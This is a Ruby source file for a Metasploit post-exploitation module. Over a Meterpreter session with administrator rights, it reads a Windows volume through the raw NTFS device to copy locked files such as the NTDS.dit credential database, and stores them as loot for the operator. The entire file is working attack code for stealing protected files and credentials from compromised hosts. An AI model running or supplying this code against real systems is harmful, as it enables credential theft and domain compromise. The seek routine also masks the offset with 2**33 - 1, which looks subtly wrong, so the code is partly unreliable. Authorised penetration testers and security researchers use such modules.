##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/parser/fs/ntfs'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Error

  ERROR = Msf::Post::Windows::Error

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Windows File Gather File from Raw NTFS',
      'Description'  => %q{
        This module gathers a file using the raw NTFS device, bypassing some Windows restrictions
        such as open file with write lock. Because it avoids the usual file locking issues, it can
        be used to retrieve files such as NTDS.dit.
      },
      'License'      => 'MSF_LICENSE',
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter'],
      'Author'       => ['Danil Bazin <danil.bazin[at]hsc.fr>'], # @danilbaz
      'References'   => [
        [ 'URL', 'http://www.amazon.com/System-Forensic-Analysis-Brian-Carrier/dp/0321268172/' ]
      ]
    ))

    register_options(
      [
        OptString.new('FILE_PATH', [true, 'The FILE_PATH to retreive from the Volume raw device', nil])
      ])
  end

  def run
    winver = sysinfo["OS"]

    fail_with(Failure::NoTarget, 'Module not valid for Windows 2000') if winver =~ /2000/
    fail_with(Failure::NoAccess, 'You don\'t have administrative privileges') unless is_admin?

    file_path = datastore['FILE_PATH']

    r = client.railgun.kernel32.GetFileAttributesW(file_path)

    case r['GetLastError']
    when ERROR::SUCCESS, ERROR::SHARING_VIOLATION, ERROR::ACCESS_DENIED, ERROR::LOCK_VIOLATION
      # Continue, we can bypass these errors as we are performing a raw
      # file read.
    when ERROR::FILE_NOT_FOUND, ERROR::PATH_NOT_FOUND
      fail_with(Failure::BadConfig, "The file, #{file_path}, does not exist, use file format C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts")
    else
      fail_with(Failure::Unknown, "Unknown error locating #{file_path}. Windows Error Code: #{r['GetLastError']} - #{r['ErrorMessage']}")
    end

    drive = file_path[0, 2]

    r = client.railgun.kernel32.CreateFileW("\\\\.\\#{drive}",
                                            'GENERIC_READ',
                                            'FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE',
                                            nil,
                                            'OPEN_EXISTING',
                                            'FILE_FLAG_WRITE_THROUGH',
                                            0)

    if r['GetLastError'] != ERROR::SUCCESS
      fail_with(Failure::Unknown, "Error opening #{drive}. Windows Error Code: #{r['GetLastError']} - #{r['ErrorMessage']}")
    end

    @handle = r['return']
    vprint_good("Successfuly opened #{drive}")
    begin
      @bytes_read = 0
      fs = Rex::Parser::NTFS.new(self)
      print_status("Trying to gather #{file_path}")
      path = file_path[3, file_path.length - 3]
      data = fs.file(path)
      file_name = file_path.split("\\")[-1]
      stored_path = store_loot("windows.file", 'application/octet-stream', session, data, file_name, "Windows file")
      print_good("Saving file : #{stored_path}")
    ensure
      client.railgun.kernel32.CloseHandle(@handle)
    end
    print_status("Post Successful")
  end

  def read(size)
    vprint_status("Reading #{size} bytes")
    client.railgun.kernel32.ReadFile(@handle, size, size, 4, nil)['lpBuffer']
  end

  def seek(offset)
    vprint_status("Seeking to offset #{offset}")
    high_offset = offset >> 32
    low_offset = offset & (2**33 - 1)
    client.railgun.kernel32.SetFilePointer(@handle, low_offset, high_offset, 0)
  end
end
